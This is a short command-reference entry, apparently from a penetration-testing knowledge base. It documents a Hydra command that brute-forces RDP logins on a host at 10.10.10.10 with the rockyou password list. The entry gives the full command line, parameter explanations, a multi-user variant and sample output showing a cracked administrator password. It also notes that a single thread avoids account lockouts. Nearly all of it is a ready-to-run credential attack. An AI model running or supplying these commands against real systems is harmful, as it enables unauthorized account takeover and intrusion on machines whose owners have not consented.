---
type: command
executor: bash
data: >-
  hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt
  rdp://10.10.10.10
platforms:
  - Linux
tags:
  - brute-force
  - rdp
verified: true
validated: true
---

# hydra-rdp-brute-force

## Command

```bash
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
```

## Description

This command uses Hydra to brute-force RDP credentials by spraying a password list against a single username on the target host. The low thread count prevents rapid lockouts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -t 1 | Number of threads (1 for slow spraying) | Yes |
| -V | Verbose output | No |
| -f | Stop after first valid password | Yes |
| -l administrator | Single login username | Yes |
| -P /usr/share/wordlists/rockyou.txt | Password list file | Yes |
| rdp://10.10.10.10 | Target protocol and IP | Yes |

## Examples

### Basic Usage

```bash
hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://10.10.10.10
```

### Multiple Users

```bash
hydra -t 1 -V -f -L users.txt -P rockyou.txt rdp://10.10.10.10
```

## Expected Output

[DATA] attacking rdp://10.10.10.10:3389/administrator
[3389][rdp] host: 10.10.10.10   login: administrator   password: password123

## Related

- [[procedures/RDP-Service-Password-Spraying]]
- [[tools/Hydra]]
